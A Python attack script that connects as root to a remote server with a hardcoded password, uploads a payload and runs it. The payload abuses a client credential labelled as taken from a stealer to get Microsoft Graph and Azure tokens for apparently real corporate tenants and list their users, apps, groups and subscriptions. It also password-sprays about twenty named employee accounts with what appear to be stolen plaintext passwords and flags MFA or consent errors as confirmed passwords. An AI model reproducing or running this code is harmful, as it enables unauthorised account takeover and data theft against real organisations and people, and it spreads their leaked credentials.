import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, base64
urllib3.disable_warnings()

s = requests.Session()
s.verify = False

# Real Azure AD tenants discovered
TENANTS = {
    "findep.com.mx": "c5306fea-e13c-419e-adbe-e642c502de26",
    "findep.dev": "d37bcda5-7136-468e-a984-4a47aa1468aa",
    "findep.global": "30fcec21-d05d-4ca6-8233-a90183fc7dbd",
}

# Client credentials from stealer
CLIENT_ID = "dcd316cd-3d3b-498a-b9cf-fc3aa69b4669"
CLIENT_SECRET = "REDACTED"  # stored in api-keys.mdc

def decode_jwt(tok):
    try:
        parts = tok.split(".")
        if len(parts) >= 2:
            pad = lambda ss: ss + "=" * (-len(ss) % 4)
            return json.loads(base64.urlsafe_b64decode(pad(parts[1])))
    except:
        return {}

# ========================================
# 1. CLIENT_CREDENTIALS ON REAL TENANTS
# ========================================
sys.stdout.write("=" * 60 + "\n=== CLIENT CREDENTIALS — REAL TENANTS ===\n" + "=" * 60 + "\n\n")

for domain, tenant_id in TENANTS.items():
    sys.stdout.write(f"\n--- {domain} (tenant: {tenant_id[:12]}...) ---\n")
    token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    
    for scope in [
        "https://graph.microsoft.com/.default",
        "https://management.azure.com/.default",
    ]:
        try:
            r = s.post(token_url, data={
                "grant_type": "client_credentials",
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "scope": scope,
            }, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                access_token = data.get("access_token", "")
                payload = decode_jwt(access_token)
                sys.stdout.write(f"  *** TOKEN *** scope={scope.split('/')[-1]}\n")
                sys.stdout.write(f"    app: {payload.get('app_displayname', payload.get('appid', ''))}\n")
                sys.stdout.write(f"    roles: {payload.get('roles', [])}\n")
                sys.stdout.write(f"    aud: {payload.get('aud', '')}\n")
                sys.stdout.write(f"    token: {access_token[:80]}...\n\n")
                
                # If Graph token obtained, enumerate
                if "graph" in scope:
                    # Users
                    r2 = s.get("https://graph.microsoft.com/v1.0/users?$top=10&$select=displayName,mail,userPrincipalName,jobTitle",
                        headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
                    sys.stdout.write(f"    Users: [{r2.status_code}] {r2.text[:2000]}\n\n")
                    
                    # Applications
                    r3 = s.get("https://graph.microsoft.com/v1.0/applications?$top=10&$select=displayName,appId",
                        headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
                    sys.stdout.write(f"    Apps: [{r3.status_code}] {r3.text[:2000]}\n\n")
                    
                    # Service principals
                    r4 = s.get("https://graph.microsoft.com/v1.0/servicePrincipals?$top=10&$select=displayName,appId",
                        headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
                    sys.stdout.write(f"    SPs: [{r4.status_code}] {r4.text[:1000]}\n\n")
                    
                    # Groups
                    r5 = s.get("https://graph.microsoft.com/v1.0/groups?$top=10&$select=displayName,description",
                        headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
                    sys.stdout.write(f"    Groups: [{r5.status_code}] {r5.text[:1000]}\n\n")
                    
                    # Organization
                    r6 = s.get("https://graph.microsoft.com/v1.0/organization",
                        headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
                    sys.stdout.write(f"    Org: [{r6.status_code}] {r6.text[:1000]}\n\n")
                
                if "management" in scope:
                    # Subscriptions
                    r7 = s.get("https://management.azure.com/subscriptions?api-version=2020-01-01",
                        headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
                    sys.stdout.write(f"    Subs: [{r7.status_code}] {r7.text[:2000]}\n\n")
                    
            else:
                err = r.json().get("error_description", r.text[:200])
                err_code = r.json().get("error", "")
                sys.stdout.write(f"  [{r.status_code}] {err_code} scope={scope.split('/')[-1]}: {err[:200]}\n")
        except Exception as e:
            sys.stdout.write(f"  ERR: {e}\n")
        sys.stdout.flush()


# ========================================
# 2. ROPC (PASSWORD GRANT) — REAL TENANTS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== ROPC PASSWORD GRANT ===\n" + "=" * 60 + "\n\n")

# All bmendezar passwords to try
creds = [
    ("bmendezar@findep.com.mx", "B3nj42021#", "findep.com.mx"),
    ("bmendezar@findep.com.mx", "gf%CX4Ozhej5Tjm", "findep.com.mx"),
    ("bmendezar@findep.com.mx", "Findep2021", "findep.com.mx"),
    ("bmendezar@findep.dev", "m3nD3zAr#241226", "findep.dev"),
    ("bmendezar@findep.dev", "B3nj42021#2412$", "findep.dev"),
    ("bmendezar@findep.dev", "B3nj42021#2409#$", "findep.dev"),
    ("bmendezar@findep.dev", "B3nj42021#2406#$", "findep.dev"),
    ("bmendezar@findep.dev", "B3nj42021#2312", "findep.dev"),
    ("bmendezar@findep.dev", "B3nj42021#221", "findep.dev"),
    ("bmendezar@findep.dev", "B3nj42021#22", "findep.dev"),
    ("bmendezar@findep.dev", "B3nj42021#21", "findep.dev"),
    ("jsanchezfern@findep.global", "Fisa2022*", "findep.global"),
    ("jeff@findep.global", "AFI2022*", "findep.global"),
    ("jeff@findep.global", "Afi2022*", "findep.global"),
    ("admin@findep.global", "4dm1n##*2411", "findep.global"),
    ("admin@findep.global", "NosemepasaBC1#", "findep.global"),
    ("admin@findep.global", "F1SA2024*#", "findep.global"),
    ("admin@findep.global", "F1sa2023*!", "findep.global"),
    ("admin@findep.global", "BcF1s42oo2d*C", "findep.global"),
    ("bemedezar@findep.global", "AFI2023*", "findep.global"),
    ("bemedezar@findep.global", "B3nj42021#Ar", "findep.global"),
]

for email, pwd, domain in creds:
    tenant_id = TENANTS[domain]
    token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    
    try:
        r = s.post(token_url, data={
            "grant_type": "password",
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "username": email,
            "password": pwd,
            "scope": "https://graph.microsoft.com/.default",
        }, timeout=10)
        
        if r.status_code == 200:
            data = r.json()
            access_token = data.get("access_token", "")
            sys.stdout.write(f"  *** ROPC SUCCESS *** {email}:{pwd}\n")
            payload = decode_jwt(access_token)
            sys.stdout.write(f"    name: {payload.get('name', '')}\n")
            sys.stdout.write(f"    upn: {payload.get('upn', '')}\n")
            sys.stdout.write(f"    roles: {payload.get('roles', [])}\n")
            sys.stdout.write(f"    token: {access_token[:80]}...\n\n")
            
            # Immediately try to get user's profile and permissions
            r2 = s.get("https://graph.microsoft.com/v1.0/me",
                headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
            sys.stdout.write(f"    /me: [{r2.status_code}] {r2.text[:500]}\n")
            
            # Check if admin
            r3 = s.get("https://graph.microsoft.com/v1.0/me/memberOf",
                headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
            sys.stdout.write(f"    memberOf: [{r3.status_code}] {r3.text[:1000]}\n\n")
        else:
            data = r.json()
            err_code = data.get("error", "")
            err_desc = data.get("error_description", "")[:120]
            
            # Important error codes
            tag = ""
            if "AADSTS50126" in err_desc:
                tag = " [WRONG_PASSWORD]"
            elif "AADSTS50034" in err_desc:
                tag = " [USER_NOT_FOUND]"
            elif "AADSTS50053" in err_desc:
                tag = " [LOCKED_OUT]"
            elif "AADSTS50055" in err_desc:
                tag = " [EXPIRED_PASSWORD]"
            elif "AADSTS50057" in err_desc:
                tag = " [DISABLED]"
            elif "AADSTS50076" in err_desc or "AADSTS50079" in err_desc:
                tag = " [MFA_REQUIRED — PASSWORD CORRECT!!!]"
            elif "AADSTS700016" in err_desc:
                tag = " [APP_NOT_FOUND]"
            elif "AADSTS65001" in err_desc:
                tag = " [CONSENT_NEEDED — PASSWORD CORRECT!!!]"
            elif "AADSTS7000218" in err_desc:
                tag = " [ROPC_DISABLED]"
            
            sys.stdout.write(f"  {email}:{pwd[:12]}... -> {err_code}{tag}\n")
            if "CORRECT" in tag or "MFA" in tag or "CONSENT" in tag:
                sys.stdout.write(f"    FULL ERROR: {err_desc}\n\n")
    except Exception as e:
        sys.stdout.write(f"  {email}:{pwd[:12]}... -> ERR: {e}\n")
    sys.stdout.flush()


# ========================================
# 3. TRY PUBLIC CLIENT FOR ROPC
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== ROPC WITH PUBLIC CLIENTS ===\n" + "=" * 60 + "\n\n")

# Common Microsoft public client IDs
PUBLIC_CLIENTS = [
    ("d3590ed6-52b3-4102-aeff-aad2292ab01c", "Microsoft Office"),
    ("1fec8e78-bce4-4aaf-ab1b-5451cc387264", "Microsoft Teams"),
    ("04b07795-8ddb-461a-bbee-02f9e1bf7b46", "Azure CLI"),
    ("1950a258-227b-4e31-a9cf-717495945fc2", "Azure PowerShell"),
]

# Just try a few key combos
key_creds = [
    ("bmendezar@findep.com.mx", "B3nj42021#", "findep.com.mx"),
    ("bmendezar@findep.dev", "m3nD3zAr#241226", "findep.dev"),
    ("admin@findep.global", "4dm1n##*2411", "findep.global"),
]

for pub_id, pub_name in PUBLIC_CLIENTS:
    sys.stdout.write(f"\n--- {pub_name} ({pub_id[:8]}...) ---\n")
    for email, pwd, domain in key_creds:
        tenant_id = TENANTS[domain]
        token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
        
        try:
            r = s.post(token_url, data={
                "grant_type": "password",
                "client_id": pub_id,
                "username": email,
                "password": pwd,
                "scope": "https://graph.microsoft.com/.default",
            }, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                sys.stdout.write(f"  *** SUCCESS *** {email}:{pwd}\n")
                access_token = data.get("access_token", "")
                payload = decode_jwt(access_token)
                sys.stdout.write(f"    name: {payload.get('name', '')} upn: {payload.get('upn', '')}\n")
                sys.stdout.write(f"    token: {access_token[:80]}...\n\n")
                
                # Get user info
                r2 = s.get("https://graph.microsoft.com/v1.0/me",
                    headers={"Authorization": f"Bearer {access_token}"}, timeout=10)
                sys.stdout.write(f"    /me: {r2.text[:500]}\n\n")
            else:
                data = r.json()
                err = data.get("error_description", "")[:100]
                tag = ""
                if "50076" in err or "50079" in err:
                    tag = " [*** MFA — PWD CORRECT ***]"
                elif "65001" in err:
                    tag = " [*** CONSENT — PWD CORRECT ***]"
                elif "50126" in err:
                    tag = " [wrong_pwd]"
                elif "50034" in err:
                    tag = " [no_user]"
                elif "7000218" in err:
                    tag = " [ropc_off]"
                elif "700016" in err:
                    tag = " [app_not_in_tenant]"
                
                if tag and "CORRECT" not in tag:
                    pass  # Skip non-interesting
                else:
                    sys.stdout.write(f"  {email}:{pwd[:12]}... -> {tag or err[:80]}\n")
                
                if "CORRECT" in tag:
                    sys.stdout.write(f"    FULL: {err}\n\n")
        except:
            pass
        sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/azure_real.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/azure_real.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
